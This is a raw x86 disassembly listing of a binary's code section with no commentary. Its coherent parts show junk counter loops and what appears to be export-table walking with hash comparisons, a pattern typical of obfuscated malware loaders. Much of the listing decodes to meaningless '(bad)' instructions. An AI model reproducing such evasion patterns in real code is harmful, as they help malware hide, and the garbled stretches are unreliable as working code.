  40192d:	and    esi,DWORD PTR [ebx]
  40192f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401930:	pop    edx
  401931:	xchg   ebx,eax
  401932:	sbb    esi,eax
  401934:	sar    DWORD PTR [eax-0x1a],cl
  401937:	test   eax,0xf4b5f20d
  40193c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40193d:	or     DWORD PTR [ebx+0x5778ea31],edi
  401943:	or     edx,DWORD PTR [ecx]
  401945:	push   eax
  401946:	add    DWORD PTR [ecx+eax*2],ebx
  401949:	cmp    al,0xd4
  40194b:	cld    
  40194c:	pop    esp
  40194d:	mov    ebp,0x627e9023
  401952:	mov    edi,0xb26f9a85
  401957:	xchg   ebp,eax
  401958:	inc    ebx
  401959:	xchg   eax,ecx
  40195b:	imul   edi,DWORD PTR [ebx-0x5e],0x11192bc
  401962:	imul   ecx,DWORD PTR [ebx+0x42],0x4080777b
  401969:	or     dh,BYTE PTR [esi]
  40196b:	xchg   edx,eax
  40196c:	mov    ecx,0x179864d0
  401971:	test   al,0x27
  401973:	mov    DWORD PTR [ecx+esi*8+0x67ce1ff],edi
  40197a:	(bad)  
  40197b:	jae    0x40195a
  40197d:	and    DWORD PTR [eax+0x135677c0],eax
  401983:	shr    dh,0xb9
  401986:	out    0xc,eax
  401988:	and    al,0x54
  40198a:	pop    ss
  40198b:	popf   
  40198c:	lods   al,BYTE PTR ds:[esi]
  40198d:	adc    BYTE PTR ds:0xd85eee0,cl
  401993:	shr    BYTE PTR [ecx+0x72],0x8
  401997:	inc    esp
  401998:	adc    DWORD PTR [ebx+0x68],0xffffffab
  40199c:	(bad)  
  40199d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40199e:	pop    ebp
  40199f:	dec    ebx
  4019a0:	jb     0x40198a
  4019a2:	mov    esp,0xcb097eff
  4019a7:	dec    edi
  4019a8:	cmp    dh,dl
  4019aa:	test   BYTE PTR [ecx-0x5d],0x1d
  4019ae:	fcom   st(7)
  4019b0:	and    edx,DWORD PTR [ebp-0x15779fc9]
  4019b6:	cmp    DWORD PTR [ecx+0x3a005ea2],esi
  4019bc:	xchg   edx,eax
  4019bd:	xor    BYTE PTR [eax],ch
  4019bf:	inc    esi
  4019c0:	dec    edx
  4019c1:	stos   DWORD PTR es:[edi],eax
  4019c2:	jmp    0x401953
  4019c4:	adc    eax,DWORD PTR [esi]
  4019c6:	mov    ebx,0x4d1664ef
  4019cb:	lea    esi,[ebx+ebx*1+0x75ff072e]
  4019d2:	or     al,ch
  4019d4:	mov    edi,0xe9000066
  4019d9:	into   
  4019da:	add    BYTE PTR [eax],al
  4019dc:	add    ah,bh
  4019de:	mov    ecx,eax
  4019e0:	mov    ecx,ebx
  4019e2:	dec    ebx
  4019e3:	mov    edi,0x495a648b
  4019e8:	aad    0x33
  4019ea:	std    
  4019eb:	rcr    BYTE PTR [edi+0x7c7c73ac],1
  4019f1:	mov    ds:0xca7c7c7c,al
  4019f6:	vpslld xmm5,xmm5,xmm7
  4019fa:	in     eax,dx
  4019fb:	mov    ebx,DWORD PTR [esi]
  4019fd:	loop   0x401a72
  4019ff:	clc    
  401a00:	aas    
  401a01:	fdivr  QWORD PTR [edi+edi*8+0x6df726b1]
  401a08:	mov    ebp,0x8046a87a
  401a0d:	and    ecx,DWORD PTR [esi]
  401a0f:	jne    0x4019bc
  401a11:	sub    DWORD PTR [ebp-0x4],0xffffffe2
  401a15:	cwde   
  401a16:	push   0x16
  401a18:	leave  
  401a19:	adc    al,0xe7
  401a1b:	xlat   BYTE PTR ds:[ebx]
  401a1c:	inc    ecx
  401a1d:	mov    eax,ds:0x8e8a25fe
  401a22:	mov    ecx,0x143919bd
  401a27:	mov    al,0x70
  401a29:	mov    ?,edx
  401a2b:	mov    eax,ds:0xe6dd1f34
  401a30:	jmp    0x7eca26c8
  401a35:	and    al,BYTE PTR [edi+0x7d]
  401a38:	jmp    0xf8f2fc31
  401a3d:	xor    DWORD PTR [edx],ebp
  401a3f:	dec    esi
  401a40:	pusha  
  401a41:	ins    DWORD PTR es:[edi],dx
  401a42:	xchg   esp,eax
  401a43:	sbb    BYTE PTR [ecx+0x16],bh
  401a46:	lods   eax,DWORD PTR ds:[esi]
  401a47:	arpl   WORD PTR [eax+edi*4-0x396d953d],di
  401a4e:	aaa    
  401a4f:	es lahf 
  401a51:	test   eax,0x86b8030c
  401a56:	adc    BYTE PTR [eax-0x1],dh
  401a59:	adc    DWORD PTR [eax],eax
  401a5b:	inc    ecx
  401a5c:	cmc    
  401a5d:	fsub   st(2),st
  401a5f:	test   DWORD PTR [ebp-0x37f954d5],ecx
  401a65:	xchg   esi,eax
  401a66:	push   ebp
  401a67:	xchg   esi,eax
  401a68:	pushf  
  401a69:	add    DWORD PTR [edx+0x55fbed89],0x53
  401a70:	cmp    eax,0xbb695229
  401a75:	and    al,0xe1
  401a77:	(bad)  
  401a78:	jl     0x401ae5
  401a7a:	adc    BYTE PTR [esp-0x9],bh
  401a7e:	dec    esi
  401a7f:	mov    ecx,0x1a3f1707
  401a84:	xchg   ecx,eax
  401a85:	xchg   ebx,eax
  401a86:	jb     0x401a3c
  401a88:	dec    ebx
  401a89:	dec    edi
  401a8a:	call   0xd87f:0x5f6231ef
  401a91:	push   eax
  401a92:	add    bh,BYTE PTR [ebx+0x65]
  401a95:	xor    eax,0x90d5c364
  401a9a:	inc    edx
  401a9b:	popa   
  401a9c:	jmp    0x4697:0x2f81
  401aa2:	jmp    0xc31a:0x3d642762
  401aa9:	aas    
  401aaa:	mov    DWORD PTR ss:[ebp-0x14],eax
  401aae:	mov    eax,DWORD PTR [ebp-0x4]
  401ab1:	add    DWORD PTR ds:0x44a6cc,ecx
  401ab7:	mov    ecx,DWORD PTR [ebp-0x14]
  401aba:	xor    eax,esi
  401abc:	add    eax,ebx
  401abe:	mov    DWORD PTR ds:0x424859,0x6998
  401ac8:	cmp    ecx,eax
  401aca:	mov    DWORD PTR ds:0x44a6d4,0x4e4a
  401ad4:	je     0x4021a9
  401ada:	mov    eax,DWORD PTR [ebp-0x14]
  401add:	mov    eax,DWORD PTR [eax+0x18]
  401ae0:	and    DWORD PTR ds:0x447994,0x0
  401aea:	xor    ecx,ecx
  401aec:	add    ecx,DWORD PTR ds:0x447994
  401af2:	inc    ecx
  401af3:	mov    DWORD PTR ds:0x447994,ecx
  401af9:	cmp    DWORD PTR ds:0x447994,0x7
  401b00:	jne    0x401b19
  401b06:	push   0x41098d
  401b0b:	push   0x41075f
  401b10:	push   DWORD PTR [ebp-0x1c]
  401b13:	call   DWORD PTR ds:0x442344
  401b19:	cmp    DWORD PTR ds:0x447994,0x6
  401b20:	jne    0x401b35
  401b26:	xor    ecx,ecx
  401b28:	xor    ecx,DWORD PTR ds:0x447994
  401b2e:	inc    ecx
  401b2f:	mov    DWORD PTR ds:0x447994,ecx
  401b35:	cmp    DWORD PTR ds:0x447994,0x12
  401b3c:	jb     0x401aea
  401b42:	sub    DWORD PTR ds:0x42485d,0x3b9b
  401b4c:	jmp    0x401c1f
  401b51:	inc    ecx
  401b52:	adc    eax,0x9d621a92
  401b57:	jns    0x401bc6
  401b59:	retf   
  401b5a:	push   cs
  401b5b:	ins    BYTE PTR es:[edi],dx
  401b5c:	jno    0x401b2a
  401b5e:	inc    edx
  401b5f:	or     eax,0x7c72d2b6
  401b64:	jl     0x401b08
  401b66:	jl     0x401be4
  401b68:	jl     0x401af2
  401b6a:	push   ecx
  401b6b:	push   ds
  401b6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b6d:	xor    bl,dl
  401b6f:	mov    DWORD PTR [ebx],esp
  401b71:	xor    edx,eax
  401b73:	out    dx,eax
  401b74:	cmp    eax,0x4943107c
  401b79:	data16 (bad) 
  401b7b:	push   ds
  401b7c:	sbb    DWORD PTR [ecx+esi*1],0xcc4a39b4
  401b83:	push   es
  401b84:	mov    dl,0x40
  401b86:	mov    bl,0xda
  401b88:	aad    0x1d
  401b8a:	int    0xea
  401b8c:	call   0x241e:0x51ee1c5
  401b93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b94:	lock push edx
  401b96:	push   es
  401b97:	ret    
  401b98:	sti    
  401b99:	dec    ebp
  401b9a:	cmp    al,0x94
  401b9c:	push   ebx
  401b9d:	dec    ecx
  401b9e:	mov    ecx,0x4892c3e3
  401ba3:	in     al,dx
  401ba4:	mov    ds:0x394a494f,eax
  401ba9:	mov    bh,0x98
  401bab:	or     DWORD PTR ds:0xbcc63655,edi
  401bb1:	push   ds
  401bb2:	outs   dx,BYTE PTR ds:[esi]
  401bb3:	(bad)
  401bb6:	das    
  401bb7:	mov    esp,0x3a3782b0
  401bbc:	xchg   ebx,eax
  401bbd:	ds jle 0x401b77
  401bc0:	in     al,0x64
  401bc2:	pop    esi
  401bc3:	das    
  401bc4:	retf   0x3ba4
  401bc7:	add    eax,0xf3fbcf81
  401bcc:	test   al,0x14
  401bce:	adc    bl,BYTE PTR [ecx-0x439bfe76]
  401bd4:	ret    0x89cc
  401bd7:	xor    eax,0x30dc0d31
  401bdc:	lods   al,BYTE PTR ds:[esi]
  401bdd:	and    ebx,ebx
  401bdf:	or     ebx,DWORD PTR [edi-0x693bcf50]
  401be5:	add    eax,0x9e462a95
  401bea:	aaa    
  401beb:	loop   0x401c64
  401bed:	mov    bh,0xf4
  401bef:	loop   0x401c41
  401bf1:	fwait
  401bf2:	fwait
  401bf3:	inc    ecx
  401bf4:	inc    edi
  401bf5:	dec    edi
  401bf6:	inc    edx
  401bf7:	xchg   DWORD PTR [ecx+0x22],edx
  401bfa:	push   eax
  401bfb:	cmp    al,bl
  401bfd:	out    dx,eax
  401bfe:	stos   DWORD PTR es:[edi],eax
  401bff:	inc    eax
  401c00:	(bad)  [esi+edi*8]
  401c03:	imul   ebp,DWORD PTR [edi+0x51],0x9703cda6
  401c0a:	fwait
  401c0b:	mov    BYTE PTR [edx+0x12],0xfe
  401c0f:	popa   
  401c10:	dec    ebx
  401c11:	mov    ecx,es
  401c13:	push   0xffffffce
  401c15:	test   eax,0xace2f44
  401c1a:	xchg   BYTE PTR ds:0x89f91041,ah
  401c20:	inc    ebp
  401c21:	loopne 0x401ba4
  401c23:	loope  0x401bd8
  401c25:	push   0x458b0000
  401c2a:	in     al,dx
  401c2b:	mov    ecx,DWORD PTR [ebp+0x8]
  401c2e:	and    DWORD PTR ds:0x44799c,0x44a6e0
  401c38:	add    ecx,DWORD PTR [eax+0x20]
  401c3b:	movzx  eax,BYTE PTR ds:0x44d424
  401c42:	and    eax,DWORD PTR ds:0x44a6e4
  401c48:	mov    ds:0x44d424,eax
  401c4d:	mov    DWORD PTR [ebp-0x28],ecx
  401c50:	sub    DWORD PTR ds:0x424865,ecx
  401c56:	mov    eax,DWORD PTR [ebp-0x14]
  401c59:	and    DWORD PTR ds:0x41074b,0x0
  401c63:	jmp    0x401c75
  401c68:	mov    ecx,DWORD PTR ds:0x41074b
  401c6e:	inc    ecx
  401c6f:	mov    DWORD PTR ds:0x41074b,ecx
  401c75:	cmp    DWORD PTR ds:0x41074b,0x1d
  401c7c:	jae    0x401cc9
  401c82:	cmp    DWORD PTR ds:0x41074b,0x9
  401c89:	jne    0x401caa
  401c8f:	push   DWORD PTR [ebp-0x20]
  401c92:	push   0x8068
  401c97:	push   0x67b9
  401c9c:	push   0x4109ab
  401ca1:	push   DWORD PTR [ebp-0x24]
  401ca4:	call   DWORD PTR ds:0x4420c8
  401caa:	cmp    DWORD PTR ds:0x41074b,0x8
  401cb1:	jne    0x401cc4
  401cb7:	mov    ecx,DWORD PTR ds:0x41074b
  401cbd:	inc    ecx
  401cbe:	mov    DWORD PTR ds:0x41074b,ecx
  401cc4:	jmp    0x401c68
  401cc9:	mov    ecx,DWORD PTR [ebp+0x8]
  401ccc:	not    DWORD PTR ds:0x44798c
  401cd2:	add    ecx,DWORD PTR [eax+0x24]
  401cd5:	xor    DWORD PTR ds:0x44a6e0,0x6435
  401cdf:	mov    DWORD PTR [ebp-0x2c],ecx
  401ce2:	jmp    0x401db5
  401ce7:	cmp    edi,DWORD PTR [ebx]
  401ce9:	mov    eax,0xbd95b815
  401cee:	cmp    eax,0x3403dcf7
  401cf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cf4:	xor    DWORD PTR [ebx],esp
  401cf6:	rcr    DWORD PTR [eax],1
  401cf8:	jne    0x401d76
  401cfa:	jl     0x401c9e
  401cfc:	jl     0x401d7a
  401cfe:	jl     0x401d19
  401d00:	push   esp
  401d01:	unpckhps xmm7,XMMWORD PTR [esi]
  401d04:	sub    al,0x79
  401d06:	(bad)  
  401d07:	sbb    DWORD PTR [edi],eax
  401d09:	pop    ss
  401d0a:	pusha  
  401d0b:	inc    edx
  401d0c:	(bad)  
  401d0d:	xchg   edx,eax
  401d0e:	inc    eax
  401d0f:	mov    cl,BYTE PTR [edi-0x21f86bfb]
  401d15:	in     al,dx
  401d16:	int    0xac
  401d18:	mov    cl,0xe0
  401d1a:	(bad)  
  401d1b:	out    dx,eax
  401d1c:	cmp    al,0xb1
  401d1e:	mov    cl,0xbb
  401d20:	ret    0xb4d6
  401d23:	in     eax,dx
  401d24:	aas    
  401d25:	cdq    
  401d26:	rcr    BYTE PTR [ebx],1
  401d28:	xchg   esi,eax
  401d29:	iret   
  401d2a:	test   ebx,esp
  401d2c:	xchg   edi,eax
  401d2d:	or     al,0xe9
  401d2f:	push   es
  401d30:	mov    dh,0x9b
  401d32:	sub    eax,0x3db82db6
  401d37:	or     BYTE PTR [ebp-0x1b],dh
  401d3a:	and    DWORD PTR [ebp+0x65cfe8d],esi
  401d40:	ret    0x6e2b
  401d43:	pushf  
  401d44:	adc    edx,DWORD PTR [ebp-0x7434c5c1]
  401d4a:	out    0xe,al
  401d4c:	mov    al,0xe0
  401d4e:	xor    eax,0x2fb39280
  401d53:	xor    DWORD PTR gs:[ecx+0x451b7470],0x4a
  401d5b:	push   ebp
  401d5c:	pop    ds
  401d5d:	cmp    cl,BYTE PTR [edi]
  401d5f:	adc    DWORD PTR [edi+0x3b],esp
  401d62:	jmp    0x4a20ce97
  401d67:	adc    DWORD PTR [esp+ebx*1-0x13486e7e],esi
  401d6e:	mov    cl,0x35
  401d70:	aam    0xe6
  401d72:	fild   WORD PTR [eax]
  401d74:	cmp    al,0xd
  401d76:	xchg   ebx,eax
  401d77:	inc    ecx
  401d78:	mov    ch,0xb6
  401d7a:	jnp    0x401df3
  401d7c:	mov    edx,0xb95c39c
  401d81:	push   eax
  401d82:	jnp    0x401d67
  401d84:	data16 loope 0x401d14
  401d87:	sbb    eax,0x472ca94
  401d8c:	inc    esi
  401d8d:	xchg   esp,eax
  401d8e:	adc    cl,BYTE PTR [edi]
  401d90:	add    ecx,ebp
  401d92:	fdiv   QWORD PTR [ecx*2-0x799bbade]
  401d99:	add    al,bl
  401d9b:	test   al,0x2c
  401d9d:	scas   al,BYTE PTR es:[edi]
  401d9e:	leave  
  401d9f:	out    0xa3,eax
  401da1:	popf   
  401da2:	outs   dx,DWORD PTR ds:[esi]
  401da3:	and    ecx,ebp
  401da5:	nop
  401da6:	add    dh,BYTE PTR ds:0x994204d7
  401dac:	mov    ds:0xce604909,eax
  401db1:	xchg   DWORD PTR [ebx+edx*1],edx
  401db4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401db5:	mov    eax,DWORD PTR [ebp-0x14]
  401db8:	mov    DWORD PTR ds:0x41075b,0x19
  401dc2:	cmp    DWORD PTR ds:0x41075b,0x0
  401dc9:	je     0x401e11
  401dcf:	cmp    DWORD PTR ds:0x41075b,0xb
  401dd6:	jne    0x401de5
  401ddc:	push   DWORD PTR [ebp-0x24]
  401ddf:	call   DWORD PTR ds:0x4420cc
  401de5:	cmp    DWORD PTR ds:0x41075b,0xc
  401dec:	jne    0x401dff
  401df2:	mov    ecx,DWORD PTR ds:0x41075b
  401df8:	dec    ecx
  401df9:	mov    DWORD PTR ds:0x41075b,ecx
  401dff:	mov    ecx,DWORD PTR ds:0x41075b
  401e05:	dec    ecx
  401e06:	mov    DWORD PTR ds:0x41075b,ecx
  401e0c:	jmp    0x401dc2
  401e11:	mov    ecx,DWORD PTR [ebp+0x8]
  401e14:	add    ecx,DWORD PTR [eax+0x1c]
  401e17:	xor    esi,esi
  401e19:	mov    DWORD PTR [ebp-0x14],ecx
  401e1c:	jmp    0x401eef
  401e21:	xor    al,0x72
  401e23:	mov    ds:0x46657dd5,eax
  401e28:	sub    eax,0xe5b1e0bc
  401e2d:	call   0x4ecf8c07
  401e32:	jne    0x401eb0
  401e34:	jl     0x401dd8
  401e36:	jl     0x401eb4
  401e38:	jl     0x401e5d
  401e3a:	scas   al,BYTE PTR es:[edi]
  401e3b:	mov    esi,ebp
  401e3d:	push   ebp
  401e3e:	sbb    eax,0xccfaa691
  401e43:	popf   
  401e44:	lods   al,BYTE PTR ds:[esi]
  401e45:	mov    dl,0x45
  401e47:	adc    BYTE PTR ds:0x69de0444,0x80
  401e4e:	ins    BYTE PTR es:[edi],dx
  401e4f:	leave  
  401e50:	xor    al,0x69
  401e52:	push   cs
  401e53:	(bad)
  401e56:	loopne 0x401e0f
  401e58:	mov    ch,BYTE PTR [eax+0x20]
  401e5b:	xor    DWORD PTR [esi+0xd061b4a],ebp
  401e61:	xchg   edx,eax
  401e62:	cmp    BYTE PTR [eax+0x4a],0x72
  401e66:	fxch   st(6)
  401e68:	and    eax,0xcbf2e025
  401e6d:	xor    ecx,DWORD PTR [eax+0x1f38db]
  401e73:	inc    di
  401e75:	loopne 0x401e00
  401e77:	mov    eax,ds:0x995bccdb
  401e7c:	ret    0x7015
  401e7f:	ficom  WORD PTR [edi+0x6a]
  401e82:	test   al,0xf
  401e84:	cmp    eax,0xad277ed6
  401e89:	or     BYTE PTR [ebx-0x5d],bl
  401e8c:	std    
  401e8d:	ja     0x401e8d
  401e8f:	lods   eax,DWORD PTR ds:[esi]
  401e90:	dec    DWORD PTR ds:0x70a76a5e
  401e96:	ins    DWORD PTR es:[edi],dx
  401e97:	mov    bh,0x50
  401e99:	pusha  
  401e9a:	pop    eax
  401e9b:	jg     0x401eb5
  401e9d:	lods   al,BYTE PTR ds:[esi]
  401e9e:	test   BYTE PTR [ecx],ah
  401ea0:	pop    edx
  401ea1:	and    ebx,0x2e
  401ea4:	jge    0x401e76
  401ea6:	mov    al,0xf6
  401ea8:	int    0x92
  401eaa:	je     0x401eb4
  401eac:	pop    ds
  401ead:	push   ebx
  401eae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401eaf:	bound  ecx,QWORD PTR [esi]
  401eb1:	retf   
  401eb2:	jae    0x401ef7
  401eb4:	sahf   
  401eb5:	(bad)  
  401eb6:	mov    cl,0x1b
  401eb8:	sub    al,0x6c
  401eba:	mov    esi,0x9107a605
  401ebf:	jecxz  0x401e58
  401ec1:	bound  ebx,QWORD PTR [eax+ebx*8-0x3551d8c3]
  401ec8:	sub    bl,BYTE PTR [ebp-0x703b7ea6]
  401ece:	mov    dh,0x52
  401ed0:	into   
  401ed1:	test   ebx,0xeeed7ed4
  401ed7:	adc    BYTE PTR [esi],0x57
  401eda:	cmc    
  401edb:	retf   0x5e20
  401ede:	xor    ch,ch
  401ee0:	mov    ebx,0x4eeacd52
  401ee5:	xchg   esp,eax
  401ee6:	mov    al,0x56
  401ee8:	mov    WORD PTR [edi],fs
  401eea:	or     al,0xbb
  401eec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401eed:	pushf  
  401eee:	pop    esp
  401eef:	mov    eax,DWORD PTR [ebp-0x28]
  401ef2:	mov    ecx,DWORD PTR [ebp+0x8]
  401ef5:	add    ecx,DWORD PTR [eax+edi*4]
  401ef8:	lea    eax,[ebp-0x8]
  401efb:	mov    DWORD PTR [ebp-0x30],ecx
  401efe:	push   eax
  401eff:	push   DWORD PTR [ebp-0x30]
  401f02:	jmp    0x401fd5
  401f07:	pop    esp
  401f08:	jecxz  0x401f20
  401f0a:	xchg   ebp,eax
  401f0b:	mov    ebp,0x1ee56b7d
  401f10:	jb     0x401ec2
  401f12:	daa    
  401f13:	hlt    
  401f14:	adc    eax,0x74f4f24f
  401f19:	jl     0x401f97
  401f1b:	mov    ds:0x4b7c7c7c,al
  401f20:	aam    0xd2
  401f22:	popa   
  401f23:	xchg   ecx,eax
  401f24:	es mov edx,0xa828bf3b
  401f2a:	int3   
  401f2b:	outs   dx,BYTE PTR ds:[esi]
  401f2c:	push   edi
  401f2d:	jg     0x401f15
  401f2f:	cli    
  401f30:	jmp    0x694b1d12
  401f35:	popf   
  401f36:	shr    DWORD PTR [esi+0x3421dbd5],1
  401f3c:	leave  
  401f3d:	outs   dx,BYTE PTR ds:[esi]
  401f3e:	push   esi
  401f3f:	adc    dl,BYTE PTR [esi+0x7c9c68c4]
  401f45:	sbb    ebp,DWORD PTR [esi+ebp*2-0x7bdde0ad]
  401f4c:	shr    BYTE PTR [eax+eiz*1],0x75
  401f50:	pop    ss
  401f51:	mov    BYTE PTR [edx+0x30d5c4da],0xb9
  401f58:	loop   0x401f9f
  401f5a:	pop    esp
  401f5b:	std    
  401f5c:	mov    ds,WORD PTR [ebx]
  401f5e:	aam    0x62
  401f60:	leave  
  401f61:	sahf   
  401f62:	jmp    0x401f42
  401f64:	xchg   BYTE PTR [edx],cl
  401f66:	mov    ch,0xea
  401f68:	add    DWORD PTR [ebx-0x6f99619d],eax
  401f6e:	mov    ch,0xda
  401f70:	or     DWORD PTR [esi],0xffffffcc
  401f73:	mov    al,ds:0x389a5c15
  401f78:	lock call 0x1c7a0b4d
  401f7e:	test   BYTE PTR [eax+0x28],bh
  401f81:	and    DWORD PTR [ecx+0x726995fe],esp
  401f87:	sub    BYTE PTR [eax-0x60edc83],al
  401f8d:	sub    al,0xf6
  401f8f:	jecxz  0x401fbd
  401f91:	popa   
  401f92:	xchg   edx,eax
  401f93:	and    al,BYTE PTR [edi]
  401f95:	xchg   ebp,eax
  401f96:	fnstcw WORD PTR [edx+0x3fb45dee]
  401f9c:	mov    dh,0xcc
  401f9e:	xchg   esi,eax
  401f9f:	xor    eax,0x7d411ead
  401fa4:	bound  edi,QWORD PTR [eax]
  401fa6:	adc    DWORD PTR [ecx],ecx
  401fa8:	cmp    al,0x99
  401faa:	and    al,0x94
  401fac:	or     eax,0x9201d040
  401fb1:	xor    BYTE PTR [esi+eiz*4-0x7e17fba3],0x54
  401fb9:	fcmovnbe st,st(3)
  401fbb:	out    0x59,al
  401fbd:	ffree  st(0)
  401fbf:	out    0xe2,eax
  401fc1:	ror    BYTE PTR [ebp-0x15f89243],cl
  401fc7:	nop
  401fc8:	inc    esi
  401fc9:	jmp    0xdf32a305
  401fce:	popa   
  401fcf:	test   al,0x80
  401fd1:	out    0xf0,eax
  401fd3:	mov    dl,BYTE PTR [esi-0x1]
  401fd6:	jne    0x401fe4
  401fd8:	jmp    0x4020ab
  401fdd:	or     dl,BYTE PTR [eax+ebp*1]
  401fe0:	mov    dl,0x2a
  401fe2:	mov    dl,0x6a
  401fe4:	push   esp
  401fe5:	int3   
  401fe6:	xchg   ebp,eax
  401fe7:	xchg   esp,eax
  401fe8:	int    0xd9
  401fea:	pop    ds
  401feb:	and    al,0x80
  401fed:	cmp    dh,BYTE PTR [edi+0x7c]
  401ff0:	jl     0x401f94
  401ff2:	jl     0x402070
  401ff4:	jl     0x402033
  401ff6:	daa    
  401ff7:	int    0x3d
  401ff9:	ja     0x401fbe
  401ffb:	push   0xffffffb5
  401ffd:	int    0x61
  401fff:	xor    al,0x6a
  402001:	fcmovu st,st(1)
  402003:	psraw  mm4,QWORD PTR [esi+0x28868a6c]
  40200a:	test   DWORD PTR [eax],ebx
  40200c:	aad    0xc3
  40200e:	jno    0x402072
  402010:	xchg   edi,eax
  402011:	mov    ecx,0x5babe8b9
  402016:	xor    cl,dl
  402018:	shr    DWORD PTR [edx],cl
  40201a:	push   esi
  40201b:	stc    
  40201c:	inc    edi
  40201d:	jp     0x40207d
  40201f:	xor    dl,BYTE PTR [eax+eax*4]
  402022:	ror    DWORD PTR [edi],1
  402024:	mov    dl,0xe7
  402026:	dec    eax
  402027:	add    dl,BYTE PTR [esi+eax*4+0x312afb2a]
  40202e:	arpl   WORD PTR [ecx],cx
  402030:	xchg   ebp,eax
  402031:	sub    al,0x8c
  402033:	inc    esi
  402034:	(bad)  
  402035:	mov    ds:0x67a8897d,eax
  40203a:	int    0x10
  40203c:	dec    edi
  40203d:	ss hlt 
  40203f:	jl     0x402073
  402041:	ret    0x808f
  402044:	stc    
  402045:	and    eax,0x8be9b0ca
  40204a:	mov    ecx,0x720e6f22
  40204f:	lods   al,BYTE PTR ds:[esi]
  402050:	pop    ecx
  402051:	xchg   BYTE PTR [eax-0x6ae0c7f9],al
  402057:	js     0x402025
  402059:	fcmovu st,st(5)
  40205b:	fcmove st,st(1)
  40205d:	loopne 0x40202f
  40205f:	dec    ebp
  402060:	fdivr  DWORD PTR [edi]
  402062:	rcl    DWORD PTR ds:0xbec9e382,0x1
  402069:	mov    dh,0x64
  40206b:	push   ecx
  40206c:	cs int 0x63
  40206f:	mov    al,ds:0x8d4620f5
  402074:	xchg   ebx,eax
  402075:	jbe    0x40200a
  402077:	mov    ebp,DWORD PTR [ecx]
  402079:	jle    0x4020ed
  40207b:	mov    ebp,DWORD PTR [edi+0x77]
  40207e:	mov    ah,0xd1
  402080:	std    
  402081:	xchg   BYTE PTR [ecx-0x38],ah
  402084:	mov    eax,ds:0x40d92347
  402089:	xchg   esi,eax
  40208a:	mov    ebx,eax
  40208c:	sbb    ecx,ebx
  40208e:	push   eax
  40208f:	xchg   ebp,eax
  402090:	test   al,0x61
  402092:	pop    edi
  402093:	gs fxch st(7)
  402096:	mov    dh,0x22
  402098:	cmp    al,0xdf
  40209a:	int3   
  40209b:	jle    0x402104
  40209d:	dec    esp
  40209e:	pop    ebx
  40209f:	mov    dl,0xd9
  4020a1:	mov    fs,WORD PTR [edi]
  4020a3:	mov    cl,0x5c
  4020a5:	mov    bl,0x50
  4020a7:	popf   
  4020a8:	or     bh,ah
  4020aa:	pop    ds
  4020ab:	call   0x409298
  4020b0:	mov    eax,DWORD PTR [ebp-0x4]
  4020b3:	mov    ecx,DWORD PTR [ebp-0x8]
  4020b6:	xor    eax,0x7510857
  4020bb:	add    eax,ebx
  4020bd:	cmp    ecx,eax
  4020bf:	jne    0x4021b5
  4020c5:	jmp    0x402198
  4020ca:	dec    esp
  4020cb:	xchg   esp,eax
  4020cc:	pop    edi
  4020cd:	add    BYTE PTR [edi-0x25],ah
  4020d0:	arpl   WORD PTR [eax-0x10],bp
  4020d3:	adc    ebx,DWORD PTR [eax-0x2d5e99b8]
  4020d9:	test   DWORD PTR [eax+0x77],esp
  4020dc:	jl     0x40215a
  4020de:	mov    ds:0xf7c7c7c,al
  4020e3:	popa   
  4020e4:	fwait
  4020e5:	pop    esi
  4020e6:	jnp    0x40213e
  4020e8:	loope  0x4020a6
  4020ea:	enter  0x4db2,0x7a
  4020ee:	pop    ecx
  4020ef:	add    al,0x2b
  4020f1:	push   esi
  4020f2:	sub    al,0xc8
  4020f4:	mov    al,0xe
  4020f6:	add    DWORD PTR [esi],eax
  4020f8:	mov    al,ds:0x8176929a
  4020fd:	gs adc eax,0xc5e7fa47
  402103:	pop    es
  402104:	(bad)  [eax]
  402106:	xchg   edx,eax
  402107:	std    
  402108:	push   ebx
  402109:	test   al,0xff
  40210b:	xchg   DWORD PTR [edx+0x68],edi
  40210e:	xchg   DWORD PTR [eax-0x26179d38],ebx
  402114:	stos   DWORD PTR es:[edi],eax
  402115:	push   cs
  402116:	push   ds
  402117:	lea    ebx,[esi-0x8]
  40211a:	jle    0x4020e8
  40211c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40211d:	dec    eax
  40211e:	hlt    
  40211f:	jge    0x40216b
  402121:	mov    ecx,0x8f43da76
  402126:	cld    
  402127:	inc    ebp
  402128:	dec    edx
  402129:	dec    eax
  40212a:	jb     0x40217d
  40212c:	mov    dh,0x99
  40212e:	mov    dh,0x5b
  402130:	pushf  
  402131:	and    al,0xfa
  402133:	sbb    BYTE PTR [eax],0x83
  402136:	pop    ebx
  402137:	adc    dl,BYTE PTR [ecx-0x12541e65]
  40213d:	push   ebp
  40213e:	adc    esp,DWORD PTR [ebp-0x6bf32ece]
  402144:	es pop es
  402146:	sub    ecx,DWORD PTR [edi-0x2e]
  402149:	mov    bh,0xe0
  40214b:	ds lock push edi
  40214e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40214f:	xchg   esp,eax
  402150:	mov    esi,0xaea4fec3
  402155:	data16 sub al,BYTE PTR [ebp-0x4af618bf]
  40215c:	adc    BYTE PTR ds:0x831f6615,al
  402162:	daa    
  402163:	aas    
  402164:	test   BYTE PTR [esi],ah
  402166:	adc    eax,0xe81f284b
  40216b:	sahf   
  40216c:	push   0x6d
  40216e:	loop   0x40217a
  402170:	mov    al,0x7e
  402172:	mov    ecx,0xb4547cef
  402177:	sub    al,0x1
  402179:	sub    ch,BYTE PTR [edi-0x18]
  40217c:	push   0x5431de7b
  402181:	jbe    0x402162
  402183:	or     DWORD PTR [ecx+0x7c],ebp
  402186:	sbb    bl,BYTE PTR [ebp+0x5923e909]
  40218c:	mov    WORD PTR [edi+0x4b],fs
  40218f:	dec    DWORD PTR [ebx]
  402191:	push   ebx
  402192:	mov    ds:0x89d2c05,eax
  402197:	push   ss
  402198:	mov    eax,DWORD PTR [ebp-0x20]
  40219b:	inc    edi
  40219c:	cmp    edi,eax
  40219e:	jb     0x401676
  4021a4:	jmp    0x402298
